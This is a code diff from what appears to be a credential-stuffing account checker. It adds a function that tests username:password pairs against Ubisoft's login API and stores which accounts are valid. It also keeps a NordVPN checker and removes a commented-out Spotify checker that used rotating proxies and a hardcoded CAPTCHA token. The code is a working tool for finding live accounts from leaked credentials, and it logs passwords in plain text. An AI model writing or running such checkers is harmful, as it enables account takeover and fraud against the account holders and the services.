@@ -1,22 +1,29 @@
+import base64
 import logging as log
 
+from manage_requests import ManageRequests
 
-# def test_spotify(self, creds):
-#     site_get = "https://accounts.spotify.com/it/login"
-#     cookies = self.req.get(site_get).cookies.get_dict()
-#     csrf = cookies["csrf_token"]
-#     cookies["__bon"] = "MHwwfC00ODY2MjU5N3wtMjA0MzgyOTA3NHwxfDF8MXwx"  # Non me gusta hardcodarlo
-    # site_post=site_get
-    # site_post = "https://accounts.spotify.com/password/login/"
-    # usr = creds.split(":")[0].strip()
-    # pwd = creds.split(":")[1].strip()
-    # self.req.headers.update({"content-length": str(9999)})
-    # account_proxy = self.set_random_proxyy()
-    # recaptcha="3AOLTBLTG3vkAxIqYcJpKqDtD25hvebW9hG0YOMwv5-WR9V3HefOgKmKbEFGeloLzjOHilwU7qZlrj6YiI4C5kg83j283SYUoZKeqvOXhL-AGXGR8PygVup5Ae58MQNCdfFTPXkWpFrb_NUB3XrbKXVasonIKqUhFGcv91PWzVBw3Nsx-GlAeAqn2pz5uVVzQpVzssSZCs6ocBj9J_Bsuwln2GrQFfcgehsI7Pzv8aIfdSmVsSSBvTup6xBWbtRq2nUrigADfF8DrLmS1aRGuOTEFOvmYPwDA8GPchAtO-bx9GrIRkXkBlFJ-P4ZEix6fNxheA0tywNncAA67rg-G3gq8avBJG33P4Wvs9GHrxGbh8GSEnZ6IEdRkRTb9RhrIlQTGukAclGId"
-    # res = self.post_with_checks(site_post,
-    #                             data={"username": usr, "password": pwd, "csrf_token": csrf},
-    #                             cookies=cookies)
-    # print(res.content)
+
+def uplay(usr, pwd, mr):
+    mr: ManageRequests
+    usr: str
+    pwd: str
+    site_post = "https://public-ubiservices.ubi.com/v3/profiles/sessions"
+    creds = str.encode(usr + ":" + pwd)
+    encoding = base64.b64encode(creds).decode()
+    mr.req.headers = {"Content-Type": "application/json", "Ubi-AppId": "e06033f4-28a4-43fb-8313-6c2d882bc4a6",
+                      "Authorization": "Basic " + encoding}
+    res = mr.post_with_checks(site_post)
+    if res:
+        if res.status_code == 200:
+            mr.db.update_result(usr, pwd, "uplay", "True")
+            log.info("Account valid {}".format(usr))
+        else:
+            mr.db.update_result(usr, pwd, "uplay", "False")
+            log.info("Account error {} {}".format(usr, pwd))
+    else:
+        mr.db.update_result(usr, pwd, "uplay", "False")
+        log.info("Account error {} {}".format(usr, pwd))
 
 
 def nordvpn(usr, pwd, mr):
@@ -47,6 +54,3 @@ def nordvpn(usr, pwd, mr):
         log.info("Account error {} {}".format(usr, pwd))
     log.info("-------------------------------")
     mr.req.cookies.clear()
-
-
-
